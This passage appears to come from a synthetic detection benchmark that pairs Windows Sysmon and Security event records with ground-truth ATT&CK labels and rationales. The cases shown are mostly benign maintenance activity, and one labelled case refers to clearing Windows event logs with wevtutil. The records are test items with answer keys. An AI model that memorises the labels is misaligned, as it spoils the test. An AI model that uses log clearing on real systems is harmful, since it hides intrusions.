          "Computer",
          "DestinationPort",
          "UtcTime"
        ]
      },
      {
        "event_id": "evt_00d584f0",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "SubjectLogonId",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "mapped",
  "rationale": "Remote-session evidence plus an explicit wevtutil clear command supplies both contextual mechanism and suspicious sequence.",
  "technique_ids": [
    "T1685.005"
  ],
  "technique_names": [
    "Clear Windows Event Logs"
  ],
  "view_id": "view_1eaf03d0"
}
```

## pair_0057e723
Family: TF_UNMAP_A; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_1c8b917e",
    "event_record_id": 114561629516018,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\ProgramData\\aspen_elm_spruce_0057e7\\run.ps1\" -Resource aspen_elm_spruce_0057e7",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
      "LogonId": "0x11601",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
      "ParentProcessId": 71172,
      "ProcessGuid": "{6831753b-70f2-c483-2b8a-f1e28f0bdcff}",
      "ProcessId": 71168,
      "User": "wlee",
      "UtcTime": "2026-01-08T12:08:00Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-08T12:08:00Z",
    "windows_event_id": 1
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\ProgramData\\aspen_elm_spruce_0057e7\\run.ps1\" -Resource aspen_elm_spruce_0057e7",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
    "LogonId": "0x11601",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
    "ParentProcessId": 71172,
    "ProcessGuid": "{6831753b-70f2-c483-2b8a-f1e28f0bdcff}",
    "ProcessId": 71168,
    "User": "wlee",
    "UtcTime": "2026-01-08T12:08:00Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_A/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1c8b917e",
        "fields": [
          "CommandLine",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The maintenance script is under ProgramData and has no encoded, download, persistence, or account-creation indicator.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_5f49a5b2"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_27109081",
    "event_record_id": 6304582178503,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=f7aaf81985dcec41b3291810c21cf2ebfb4d2716e7dea503aa6d349321504560",
      "Image": "C:\\Windows\\System32\\taskeng.exe",
      "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
      "LogonId": "0x11601",
      "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe",
      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
      "ParentProcessGuid": "{eccc4399-4577-c840-4888-7df04bd7a5e3}",
      "ParentProcessId": 71164,
      "ProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
      "ProcessId": 71172,
      "User": "wlee",
      "UtcTime": "2026-01-08T12:07:57Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-08T12:07:57Z",
    "windows_event_id": 1
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_1c8b917e",
    "event_record_id": 114561629516018,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\ProgramData\\aspen_elm_spruce_0057e7\\run.ps1\" -Resource aspen_elm_spruce_0057e7",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
      "LogonId": "0x11601",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
      "ParentProcessId": 71172,
      "ProcessGuid": "{6831753b-70f2-c483-2b8a-f1e28f0bdcff}",
      "ProcessId": 71168,
      "User": "wlee",
      "UtcTime": "2026-01-08T12:08:00Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-01-08T12:08:00Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=f7aaf81985dcec41b3291810c21cf2ebfb4d2716e7dea503aa6d349321504560",
    "Image": "C:\\Windows\\System32\\taskeng.exe",
    "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
    "LogonId": "0x11601",
    "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe",
    "ParentImage": "C:\\Windows\\System32\\svchost.exe",
    "ParentProcessGuid": "{eccc4399-4577-c840-4888-7df04bd7a5e3}",
    "ParentProcessId": 71164,
    "ProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
    "ProcessId": 71172,
    "User": "wlee",
    "UtcTime": "2026-01-08T12:07:57Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -File \"C:\\ProgramData\\aspen_elm_spruce_0057e7\\run.ps1\" -Resource aspen_elm_spruce_0057e7",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=c515e8e7d219f83538d2b67a22458dcf00e518f53376ac1706c83df3948be2ed",
    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
    "LogonGuid": "{67098335-0b01-bcce-fa73-4fcfd8483e63}",
    "LogonId": "0x11601",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{05bbe661-96c7-0878-8a85-206b16babc7f}",
    "ParentProcessId": 71172,
    "ProcessGuid": "{6831753b-70f2-c483-2b8a-f1e28f0bdcff}",
    "ProcessId": 71168,
    "User": "wlee",
    "UtcTime": "2026-01-08T12:08:00Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_A/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_1c8b917e",
        "fields": [
          "CommandLine",
          "Computer",
          "Image",
          "ParentImage"
        ]
      },
      {
        "event_id": "evt_27109081",
        "fields": [
          "Computer",
          "Image",
          "ParentImage"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "Context confirms the same routine PowerShell maintenance workflow with an explicit maintenance process or actor.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_eb94725a"
}
```

## pair_105c48d7
Family: TF_UNMAP_ACCT; split: test
Transition: ambiguous -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_8b0e56b1",
    "event_record_id": 46668571967095,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4720,
      "SubjectLogonId": "0x94e5",
      "SubjectUserName": "Administrator",
      "TargetUserName": "backupsvc",
      "TimeCreated": "2026-04-12T13:18:22Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-12T13:18:22Z",
    "windows_event_id": 4720
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WORKSTATION01",
    "EventID": 4720,
    "SubjectLogonId": "0x94e5",
    "SubjectUserName": "Administrator",
    "TargetUserName": "backupsvc",
    "TimeCreated": "2026-04-12T13:18:22Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_ACCT/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_8b0e56b1",
        "fields": [
          "SubjectLogonId",
          "SubjectUserName",
          "TargetUserName"
        ]
      }
    ]
  },
  "label_status": "ambiguous",
  "rationale": "EID 4720 identifies the account and creator but does not prove that provisioning was authorized in the single view.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_ae260bcd"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_5b6ccda0",
    "event_record_id": 7826572170638,
    "fields": {
      "CommandLine": "C:\\ProgramData\\IAM\\account-provisioner.exe --create backupsvc --role backup --scope cedar_spruce_elm_105c48",
      "Computer": "WORKSTATION01",
      "EventID": 4688,
      "NewProcessId": "0x94e8",
      "NewProcessName": "C:\\ProgramData\\IAM\\account-provisioner.exe",
      "ParentProcessName": "C:\\ProgramData\\IAM\\management-agent.exe",
      "ProcessId": "0x94e0",
      "SubjectLogonId": "0x94e5",
      "SubjectUserName": "Administrator",
      "TargetUserName": "Administrator",
      "TimeCreated": "2026-04-12T13:18:19Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-12T13:18:19Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WORKSTATION01",
    "event_id": "evt_8b0e56b1",
    "event_record_id": 46668571967095,
    "fields": {
      "Computer": "WORKSTATION01",
      "EventID": 4720,
      "SubjectLogonId": "0x94e5",
      "SubjectUserName": "Administrator",
      "TargetUserName": "backupsvc",
      "TimeCreated": "2026-04-12T13:18:22Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-12T13:18:22Z",
    "windows_event_id": 4720
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\ProgramData\\IAM\\account-provisioner.exe --create backupsvc --role backup --scope cedar_spruce_elm_105c48",
    "Computer": "WORKSTATION01",
    "EventID": 4688,
    "NewProcessId": "0x94e8",
    "NewProcessName": "C:\\ProgramData\\IAM\\account-provisioner.exe",
    "ParentProcessName": "C:\\ProgramData\\IAM\\management-agent.exe",
    "ProcessId": "0x94e0",
    "SubjectLogonId": "0x94e5",
    "SubjectUserName": "Administrator",
    "TargetUserName": "Administrator",
    "TimeCreated": "2026-04-12T13:18:19Z"
  },
  {
    "Computer": "WORKSTATION01",
    "EventID": 4720,
    "SubjectLogonId": "0x94e5",
    "SubjectUserName": "Administrator",
    "TargetUserName": "backupsvc",
    "TimeCreated": "2026-04-12T13:18:22Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_ACCT/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_8b0e56b1",
        "fields": [
          "Computer",
          "SubjectLogonId",
          "SubjectUserName",
          "TargetUserName",
          "TimeCreated"
        ]
      },
      {
        "event_id": "evt_5b6ccda0",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "SubjectLogonId",
          "SubjectUserName",
          "TimeCreated"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The linked account-provisioning process, management parent, explicit role, ordering, host, and logon match the approved synthetic provisioning case; external authorization is not independently recorded.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_be2291d1"
}
```

## pair_046f70bf
Family: TF_UNMAP_B; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_23261784",
    "event_record_id": 18552772827695,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c ipconfig /flushdns && nslookup alder_larch_willow_046f70.example.invalid",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x5bb8",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x5bb4",
      "SubjectLogonId": "0x5bb9",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-04-19T00:16:45Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-19T00:16:45Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c ipconfig /flushdns && nslookup alder_larch_willow_046f70.example.invalid",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x5bb8",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x5bb4",
    "SubjectLogonId": "0x5bb9",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-04-19T00:16:45Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_B/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_23261784",
        "fields": [
          "CommandLine",
          "NewProcessName",
          "ParentProcessName",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The command is a routine local diagnostic action with no staged payload, persistence, transfer, or account mutation.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_757298dd"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_23261784",
    "event_record_id": 18552772827695,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c ipconfig /flushdns && nslookup alder_larch_willow_046f70.example.invalid",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x5bb8",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x5bb4",
      "SubjectLogonId": "0x5bb9",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-04-19T00:16:45Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-19T00:16:45Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_4702cc1b",
    "event_record_id": 208019114161807,
    "fields": {
      "CommandLine": "ipconfig /flushdns",
      "Computer": "WEB01",
      "EventID": 4688,
      "NewProcessId": "0x5bbc",
      "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe",
      "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ProcessId": "0x5bb8",
      "SubjectLogonId": "0x5bb9",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-04-19T00:16:48Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-04-19T00:16:48Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c ipconfig /flushdns && nslookup alder_larch_willow_046f70.example.invalid",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x5bb8",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x5bb4",
    "SubjectLogonId": "0x5bb9",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-04-19T00:16:45Z"
  },
  {
    "CommandLine": "ipconfig /flushdns",
    "Computer": "WEB01",
    "EventID": 4688,
    "NewProcessId": "0x5bbc",
    "NewProcessName": "C:\\Windows\\System32\\ipconfig.exe",
    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ProcessId": "0x5bb8",
    "SubjectLogonId": "0x5bb9",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-04-19T00:16:48Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_B/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_23261784",
        "fields": [
          "CommandLine",
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "SubjectUserName"
        ]
      },
      {
        "event_id": "evt_4702cc1b",
        "fields": [
          "Computer",
          "NewProcessName",
          "ParentProcessName",
          "SubjectUserName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The helpdesk DNS-diagnostic invocation and related cmd.exe context match the approved synthetic local-maintenance case; external authorization is not independently recorded.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_01441243"
}
```

## pair_287e21b2
Family: TF_UNMAP_C; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_7600b982",
    "event_record_id": 36744003217488,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4698,
      "SubjectLogonId": "0x5591",
      "SubjectUserName": "SYSTEM",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\cleanmgr.exe</Command><Arguments>/sagerun:31776</Arguments></Exec></Actions></Task>",
      "TaskName": "\\Microsoft\\Windows\\DiskCleanup_fir_birch_spruce_287e21",
      "TimeCreated": "2026-05-09T15:48:57Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-09T15:48:57Z",
    "windows_event_id": 4698
  }
]
```

### single: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4698,
    "SubjectLogonId": "0x5591",
    "SubjectUserName": "SYSTEM",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\cleanmgr.exe</Command><Arguments>/sagerun:31776</Arguments></Exec></Actions></Task>",
    "TaskName": "\\Microsoft\\Windows\\DiskCleanup_fir_birch_spruce_287e21",
    "TimeCreated": "2026-05-09T15:48:57Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_C/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_7600b982",
        "fields": [
          "SubjectUserName",
          "TaskContent",
          "TaskName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The task name and System32 cleanmgr.exe content identify routine Windows maintenance.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_72e6b7da"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "WEB01",
    "event_id": "evt_7600b982",
    "event_record_id": 36744003217488,
    "fields": {
      "Computer": "WEB01",
      "EventID": 4698,
      "SubjectLogonId": "0x5591",
      "SubjectUserName": "SYSTEM",
      "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\cleanmgr.exe</Command><Arguments>/sagerun:31776</Arguments></Exec></Actions></Task>",
      "TaskName": "\\Microsoft\\Windows\\DiskCleanup_fir_birch_spruce_287e21",
      "TimeCreated": "2026-05-09T15:48:57Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-09T15:48:57Z",
    "windows_event_id": 4698
  },
  {
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "computer": "WEB01",
    "event_id": "evt_e5cf0968",
    "event_record_id": 182164336238333,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cleanmgr.exe /sagerun:31776",
      "Computer": "WEB01",
      "EventID": 1,
      "Hashes": "SHA256=ffc61da23e55e3ac2e17da63870d43165a7150cbb4b703a0ecb84bc19d235eb2",
      "Image": "C:\\Windows\\System32\\cleanmgr.exe",
      "LogonGuid": "{0c16c974-5a22-02a3-90ef-58773b907226}",
      "LogonId": "0x5591",
      "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
      "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
      "ParentProcessGuid": "{0e74e3ac-d7c7-2226-b3f7-3e3e6826534f}",
      "ParentProcessId": 21900,
      "ProcessGuid": "{a5ad708d-5efd-4f2e-741d-945edf8baac2}",
      "ProcessId": 21908,
      "User": "SYSTEM",
      "UtcTime": "2026-05-09T15:49:00Z"
    },
    "provider": "Microsoft-Windows-Sysmon",
    "timestamp_utc": "2026-05-09T15:49:00Z",
    "windows_event_id": 1
  }
]
```

### contextual: inference payload
```json
[
  {
    "Computer": "WEB01",
    "EventID": 4698,
    "SubjectLogonId": "0x5591",
    "SubjectUserName": "SYSTEM",
    "TaskContent": "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"><Triggers><BootTrigger><Enabled>true</Enabled></BootTrigger></Triggers><Settings><Hidden>false</Hidden></Settings><Actions><Exec><Command>C:\\Windows\\System32\\cleanmgr.exe</Command><Arguments>/sagerun:31776</Arguments></Exec></Actions></Task>",
    "TaskName": "\\Microsoft\\Windows\\DiskCleanup_fir_birch_spruce_287e21",
    "TimeCreated": "2026-05-09T15:48:57Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cleanmgr.exe /sagerun:31776",
    "Computer": "WEB01",
    "EventID": 1,
    "Hashes": "SHA256=ffc61da23e55e3ac2e17da63870d43165a7150cbb4b703a0ecb84bc19d235eb2",
    "Image": "C:\\Windows\\System32\\cleanmgr.exe",
    "LogonGuid": "{0c16c974-5a22-02a3-90ef-58773b907226}",
    "LogonId": "0x5591",
    "ParentCommandLine": "C:\\Windows\\System32\\taskeng.exe",
    "ParentImage": "C:\\Windows\\System32\\taskeng.exe",
    "ParentProcessGuid": "{0e74e3ac-d7c7-2226-b3f7-3e3e6826534f}",
    "ParentProcessId": 21900,
    "ProcessGuid": "{a5ad708d-5efd-4f2e-741d-945edf8baac2}",
    "ProcessId": 21908,
    "User": "SYSTEM",
    "UtcTime": "2026-05-09T15:49:00Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_C/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_7600b982",
        "fields": [
          "Computer",
          "SubjectUserName",
          "TaskContent",
          "TaskName"
        ]
      },
      {
        "event_id": "evt_e5cf0968",
        "fields": [
          "Computer",
          "Image",
          "User"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The task configuration and related cleanmgr process-creation record match the approved synthetic disk-maintenance case; the task trigger is not directly observed.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_6e4915f7"
}
```

## pair_01bc89fe
Family: TF_UNMAP_CMD; split: test
Transition: unmapped -> unmapped
### single: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_cbaa3e78",
    "event_record_id": 6296078374082,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c dir C:\\ProgramData\\beech_aspen_holly_01bc89",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0x9598",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x959c",
      "SubjectLogonId": "0x9599",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-05-12T07:09:20Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-12T07:09:20Z",
    "windows_event_id": 4688
  }
]
```

### single: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c dir C:\\ProgramData\\beech_aspen_holly_01bc89",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0x9598",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x959c",
    "SubjectLogonId": "0x9599",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-05-12T07:09:20Z"
  }
]
```

### single: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_CMD/single",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_cbaa3e78",
        "fields": [
          "CommandLine",
          "NewProcessName",
          "ParentProcessName"
        ]
      }
    ]
  },
  "label_status": "unmapped",
  "rationale": "The command shell records a directory listing under a maintenance path; no selected ATT&CK behavior is visible in this view.",
  "technique_ids": [],
  "technique_names": [],
  "view_id": "view_3045d83b"
}
```

### contextual: raw telemetry
```json
[
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_7d72f5f3",
    "event_record_id": 117280597774184,
    "fields": {
      "CommandLine": "C:\\Windows\\explorer.exe /select,C:\\ProgramData\\beech_aspen_holly_01bc89",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0x959c",
      "NewProcessName": "C:\\Windows\\explorer.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x9594",
      "SubjectLogonId": "0x9599",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-05-12T07:09:17Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-12T07:09:17Z",
    "windows_event_id": 4688
  },
  {
    "channel": "Security",
    "computer": "DB01",
    "event_id": "evt_cbaa3e78",
    "event_record_id": 6296078374082,
    "fields": {
      "CommandLine": "C:\\Windows\\System32\\cmd.exe /c dir C:\\ProgramData\\beech_aspen_holly_01bc89",
      "Computer": "DB01",
      "EventID": 4688,
      "NewProcessId": "0x9598",
      "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessName": "C:\\Windows\\explorer.exe",
      "ProcessId": "0x959c",
      "SubjectLogonId": "0x9599",
      "SubjectUserName": "helpdesk",
      "TargetUserName": "helpdesk",
      "TimeCreated": "2026-05-12T07:09:20Z"
    },
    "provider": "Microsoft-Windows-Security-Auditing",
    "timestamp_utc": "2026-05-12T07:09:20Z",
    "windows_event_id": 4688
  }
]
```

### contextual: inference payload
```json
[
  {
    "CommandLine": "C:\\Windows\\explorer.exe /select,C:\\ProgramData\\beech_aspen_holly_01bc89",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0x959c",
    "NewProcessName": "C:\\Windows\\explorer.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x9594",
    "SubjectLogonId": "0x9599",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-05-12T07:09:17Z"
  },
  {
    "CommandLine": "C:\\Windows\\System32\\cmd.exe /c dir C:\\ProgramData\\beech_aspen_holly_01bc89",
    "Computer": "DB01",
    "EventID": 4688,
    "NewProcessId": "0x9598",
    "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
    "ParentProcessName": "C:\\Windows\\explorer.exe",
    "ProcessId": "0x959c",
    "SubjectLogonId": "0x9599",
    "SubjectUserName": "helpdesk",
    "TargetUserName": "helpdesk",
    "TimeCreated": "2026-05-12T07:09:20Z"
  }
]
```

### contextual: ground truth and evidence references
```json
{
  "approval_reference": "registry-sha256:0f4db1c62ab3bc59a6da6647bf91f65428d3fe2d86881530d36497544084b8b2#TF_UNMAP_CMD/contextual",
  "evidence_refs": {
    "decision": [
      {
        "event_id": "evt_cbaa3e78",
        "fields": [
          "CommandLine",
          "Computer",
